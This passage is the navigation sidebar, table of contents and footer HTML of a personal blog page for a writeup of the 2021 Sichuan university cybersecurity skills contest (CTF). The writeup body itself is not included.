+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">The_Itach1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/06/11/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/">http://example.com/2022/06/11/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/05/15/Eran1WOK8LZmQXw.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/11/buuctf%E7%9A%84wp/"><img class="prev-cover" src="https://i.loli.net/2020/12/02/GBH9cj7JztSasMh.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">buuCTF的wp</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/11/2021.6.1%E8%90%8C%E6%96%B0%E8%B5%9B%20re%20wp/"><img class="next-cover" src="https://i.loli.net/2021/06/05/THf3oiypBSDq6bx.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2021.6.1萌新赛 re wp</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">The_Itach1</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-writeup"><span class="toc-number">1.</span> <span class="toc-text">2021年四川省大学生网络安全技能大赛  writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、 战队信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.2.</span> <span class="toc-text">二、解题情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">三、 解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%80-easyyaml"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目一 easyyaml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">操作内容：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%80%BC"><span class="toc-number">1.4.1.</span> <span class="toc-text">flag值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%8C-papapa"><span class="toc-number">1.4.2.</span> <span class="toc-text">题目二 papapa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">操作内容：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%80%BC-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">flag值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%89-Misc-%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C"><span class="toc-number">1.4.5.</span> <span class="toc-text">题目三 Misc 我的世界</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-2"><span class="toc-number">1.4.6.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E8%AF%A5%E9%A2%98%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%B7%E8%AF%A6%E7%BB%86%E5%86%99%E5%87%BA%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%88%AA%E5%9B%BE"><span class="toc-number">1.4.7.</span> <span class="toc-text">如该题使用自己编写的脚本请详细写出，不允许截图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9B-Misc-disk-recover"><span class="toc-number">1.4.8.</span> <span class="toc-text">题目四 Misc disk-recover</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-3"><span class="toc-number">1.4.9.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">1.4.10.</span> <span class="toc-text">flag:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%94-Misc-pack"><span class="toc-number">1.4.11.</span> <span class="toc-text">题目五 Misc pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9"><span class="toc-number">1.4.12.</span> <span class="toc-text">操作内容:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.5.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">脚本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">flag：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-0bed66d154ccbdd07a6342abf97a5cfc"><span class="toc-number">1.5.3.</span> <span class="toc-text">flag{0bed66d154ccbdd07a6342abf97a5cfc}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%85%AD-em0ji"><span class="toc-number">1.5.4.</span> <span class="toc-text">题目六 em0ji</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-4"><span class="toc-number">1.5.5.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%EF%BC%9A-1"><span class="toc-number">1.5.6.</span> <span class="toc-text">脚本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-1"><span class="toc-number">1.5.7.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%83-easy-re"><span class="toc-number">1.5.8.</span> <span class="toc-text">题目七 easy_re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-5"><span class="toc-number">1.5.9.</span> <span class="toc-text">操作内容：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%80%BC-2"><span class="toc-number">1.5.10.</span> <span class="toc-text">flag值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%85%AB-easy-pyc"><span class="toc-number">1.5.11.</span> <span class="toc-text">题目八 easy.pyc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-6"><span class="toc-number">1.5.12.</span> <span class="toc-text">操作内容：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-2"><span class="toc-number">1.5.12.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%80%BC-3"><span class="toc-number">1.5.13.</span> <span class="toc-text">flag值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B9%9D-base%E5%8F%98%E5%BD%A2%E8%AE%A1-exe"><span class="toc-number">1.5.14.</span> <span class="toc-text">题目九 base变形计.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-7"><span class="toc-number">1.5.15.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-2"><span class="toc-number">1.5.16.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%8D%81-2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">1.5.17.</span> <span class="toc-text">题目十 2021年四川省大学生网络安全技能大赛问卷调查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-8"><span class="toc-number">1.5.18.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-3"><span class="toc-number">1.5.19.</span> <span class="toc-text">脚本:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-3"><span class="toc-number">1.5.20.</span> <span class="toc-text">flag:</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/%E9%B9%8F%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%82%80%E8%AF%B7%E8%B5%9Bwp/" title="鹏程实验室邀请赛wp"><img src="https://i.loli.net/2021/01/16/obZv2RnrgFj6aLq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="鹏程实验室邀请赛wp"/></a><div class="content"><a class="title" href="/2022/06/11/%E9%B9%8F%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%82%80%E8%AF%B7%E8%B5%9Bwp/" title="鹏程实验室邀请赛wp">鹏程实验室邀请赛wp</a><time datetime="2022-06-10T17:10:13.979Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/%E8%99%8E%E7%AC%A6ctf&amp;%E7%BA%A2%E6%98%8E%E8%B0%B7%E7%9A%84wp/" title="虎符ctf的wp&amp;红明谷杯的wp"><img src="https://i.loli.net/2021/04/09/vfNLV8F2DPyglKH.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虎符ctf的wp&amp;红明谷杯的wp"/></a><div class="content"><a class="title" href="/2022/06/11/%E8%99%8E%E7%AC%A6ctf&amp;%E7%BA%A2%E6%98%8E%E8%B0%B7%E7%9A%84wp/" title="虎符ctf的wp&amp;红明谷杯的wp">虎符ctf的wp&amp;红明谷杯的wp</a><time datetime="2022-06-10T17:10:13.977Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/%E8%8A%B1%E6%8C%87%E4%BB%A4/" title="逆向之&quot;花&quot;"><img src="https://i.loli.net/2020/12/18/XvcSVTGQWYPFR1M.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逆向之&quot;花&quot;"/></a><div class="content"><a class="title" href="/2022/06/11/%E8%8A%B1%E6%8C%87%E4%BB%A4/" title="逆向之&quot;花&quot;">逆向之&quot;花&quot;</a><time datetime="2022-06-10T17:10:13.974Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/%E7%AE%80%E5%8D%95%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/" title="Simple software cracking"><img src="https://i.loli.net/2021/12/02/gaPGbVDE1NFzupY.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Simple software cracking"/></a><div class="content"><a class="title" href="/2022/06/11/%E7%AE%80%E5%8D%95%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/" title="Simple software cracking">Simple software cracking</a><time datetime="2022-06-10T17:10:13.969Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/%E7%A5%A5%E4%BA%91%E6%9D%AF%20%E9%83%A8%E5%88%86%20re%20wp/" title="祥云杯 部分 re wp"><img src="https://i.loli.net/2021/08/26/TAgouixStP4aqlL.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="祥云杯 部分 re wp"/></a><div class="content"><a class="title" href="/2022/06/11/%E7%A5%A5%E4%BA%91%E6%9D%AF%20%E9%83%A8%E5%88%86%20re%20wp/" title="祥云杯 部分 re wp">祥云杯 部分 re wp</a><time datetime="2022-06-10T17:10:13.967Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2021/05/15/Eran1WOK8LZmQXw.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By The_Itach1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">木叶飞舞之处，火亦生生不息</div><div class="icp"><a><span></span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
